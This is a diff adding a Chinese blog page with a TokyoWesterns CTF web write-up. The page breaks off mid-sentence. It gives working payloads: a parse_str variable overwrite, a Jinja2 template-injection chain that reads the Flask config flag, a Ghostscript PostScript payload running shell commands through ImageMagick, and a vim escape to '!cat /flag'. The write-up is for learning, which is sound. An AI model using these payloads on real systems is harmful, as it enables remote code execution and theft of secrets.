@@ -1,0 +1,1647 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="TokyoWesterns CTF | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>TokyoWesterns CTF · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">TokyoWesterns CTF</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            TokyoWesterns CTF
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">1,844</span> / Reading time: <span class="post-count">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/09/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="SimpleAuth"><a href="#SimpleAuth" class="headerlink" title="SimpleAuth"></a>SimpleAuth</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SERVER[<span class="string">'QUERY_STRING'</span>])) &#123;</span><br><span class="line">    $query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">    $res = parse_str($query);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'action'</span>]))&#123;</span><br><span class="line">        $action = $res[<span class="string">'action'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($action === <span class="string">'auth'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        $user = $res[<span class="string">'user'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($res[<span class="string">'pass'</span>])) &#123;</span><br><span class="line">        $pass = $res[<span class="string">'pass'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($user) &amp;&amp; !<span class="keyword">empty</span>($pass)) &#123;</span><br><span class="line">        $hashed_password = hash(<span class="string">'md5'</span>, $user.$pass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($hashed_password) &amp;&amp; $hashed_password === <span class="string">'c019f6e5cd8aa0bbbcc6e994a54c757e'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'fail :('</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<p><code>http://simpleauth.chal.ctf.westerns.tokyo/?hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e&amp;action=auth</code></p>
+<h1 id="Shrine"><a href="#Shrine" class="headerlink" title="Shrine"></a>Shrine</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist])+s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="递归打印对象的所有字属性"><a href="#递归打印对象的所有字属性" class="headerlink" title="递归打印对象的所有字属性"></a>递归打印对象的所有字属性</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(obj, max_depth)</span>:</span></span><br><span class="line">    </span><br><span class="line">    visited_clss = []</span><br><span class="line">    visited_objs = []</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">(obj, path=<span class="string">'obj'</span>, depth=<span class="number">0</span>)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> path, obj</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> depth == max_depth:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, type):</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_clss:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_clss.append(obj)</span><br><span class="line">            print(obj)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> obj <span class="keyword">in</span> visited_objs:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            visited_objs.append(obj)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># attributes</span></span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dir(obj):</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">'__'</span>) <span class="keyword">and</span> name.endswith(<span class="string">'__'</span>):</span><br><span class="line">                <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span>  (<span class="string">'__globals__'</span>, <span class="string">'__class__'</span>, <span class="string">'__self__'</span>,</span><br><span class="line">                                 <span class="string">'__weakref__'</span>, <span class="string">'__objclass__'</span>, <span class="string">'__module__'</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            attr = getattr(obj, name)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> visit(attr, <span class="string">'&#123;&#125;.&#123;&#125;'</span>.format(path, name), depth + <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># dict values</span></span><br><span class="line">        <span class="keyword">if</span> hasattr(obj, <span class="string">'items'</span>) <span class="keyword">and</span> callable(obj.items):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">for</span> k, v <span class="keyword">in</span> obj.items():</span><br><span class="line">                    <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(k)), depth)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):</span><br><span class="line">            <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(obj):</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> visit(v, <span class="string">'&#123;&#125;[&#123;&#125;]'</span>.format(path, repr(i)), depth)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> visit(obj)</span><br></pre></td></tr></table></figure>
+<h3 id="寻找config"><a href="#寻找config" class="headerlink" title="寻找config"></a>寻找config</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> path, obj <span class="keyword">in</span> search(flask.request, <span class="number">10</span>):</span><br><span class="line">	<span class="keyword">if</span> str(obj) == app.config[<span class="string">'FLAG'</span>]:</span><br><span class="line">	<span class="keyword">return</span> path</span><br></pre></td></tr></table></figure>
+<p><code>obj.application.__self__._load_form_data.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]</code></p>
+<p>除了<code>request</code>对象之外，其他全局变量类似于<code>g</code>, <code>session</code>通过更多或更少层次的遍历，也是可以找到flag。</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://shrine.chal.ctf.westerns.tokyo/shrine/%<span class="number">7</span>B%<span class="number">7</span>Brequest.application.__self__._load_form_data.__globals__[<span class="string">'json'</span>].JSONEncoder.default.__globals__[<span class="string">'current_app'</span>].config[<span class="string">'FLAG'</span>]%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+<h1 id="Slack-emoji-converter"><a href="#Slack-emoji-converter" class="headerlink" title="Slack emoji converter"></a>Slack emoji converter</h1>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    make_response,</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/conv', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">()</span>:</span></span><br><span class="line">    f = request.files.get(<span class="string">'image'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    ext = f.filename.split(<span class="string">'.'</span>)[<span class="number">-1</span>]</span><br><span class="line">    fname = tempfile.mktemp(<span class="string">"emoji"</span>)</span><br><span class="line">    fname = <span class="string">"&#123;&#125;.&#123;&#125;"</span>.format(fname, ext)</span><br><span class="line">    f.save(fname)</span><br><span class="line">    img = Image.open(fname)</span><br><span class="line">    w, h = img.size</span><br><span class="line">    r = <span class="number">128</span>/max(w, h)</span><br><span class="line">    newimg = img.resize((int(w*r), int(h*r)))</span><br><span class="line">    newimg.save(fname)</span><br><span class="line">    response = make_response()</span><br><span class="line">    response.data = open(fname, <span class="string">"rb"</span>).read()</span><br><span class="line">    response.headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=emoji_&#123;&#125;'</span>.format(f.filename)</span><br><span class="line">    os.unlink(fname)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">8080</span>, debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码本身没有问题，问题出在依赖的<code>PIL.Image</code>库,该库依赖于<code>ImageMagick</code>。可以通过<code>sudo apt-get install imagemagick</code></p>
+<p>ImageMagick1day利用。</p>
+<p>代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python: newimg = img.resize((int(w*r), int(h*r)))</span><br><span class="line">=&gt; </span><br><span class="line">命令行: convert shell.jpeg -crop 100X100+10+10 img_crop.jpeg</span><br></pre></td></tr></table></figure>
+<p>主要是imagemaick的ghost script RCE漏洞。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null</span><br></pre></td></tr></table></figure>
+<p>若成功执行则存在漏洞。</p>
+<p>ubuntu下payload:</p>
+<p>shell.jpeg:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+<p>运行:</p>
+<blockquote>
+<p>convert shell.jpeg what.gif</p>
+</blockquote>
+<p>结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/goscript$ convert shell.jpeg what.gif</span><br><span class="line">uid=1000(qianfa) gid=1000(qianfa) groups=1000(qianfa),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br><span class="line">convert: FailedToExecuteCommand `"gs" -q -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 "-sDEVICE=pngalpha" -dTextAlphaBits=4 -dGraphicsAlphaBits=4 "-r72x72" -g612x792  "-sOutputFile=/tmp/magick-115904M-6fITFX1ezd%d" "-f/tmp/magick-115904XRfng5YFMWcZ" "-f/tmp/magick-115904phWq9gVRvPQK" -c showpage' (-1) @ error/delegate.c/ExternalDelegateCommand/461.</span><br><span class="line">convert: no images defined `what.gif' @ error/convert.c/ConvertImageCommand/3210.</span><br></pre></td></tr></table></figure>
+<h1 id="vimshell"><a href="#vimshell" class="headerlink" title="vimshell"></a>vimshell</h1><p><code>:</code>, <code>g</code> and <code>Q</code> 三个字符从vim中去掉了，但是没有去掉<code>K</code>,</p>
+<p>在文件中命令之前，比如<code>diff</code>前边按<code>K</code>可以显示<code>man diff</code>，也就是<code>diff</code>的帮助命令,</p>
+<p>然而<code>man</code>可以执行命令。</p>
+<blockquote>
+<p>!ls /</p>
+<p>!cat /flag</p>
+</blockquote>
+<p>或者：</p>
+<blockquote>
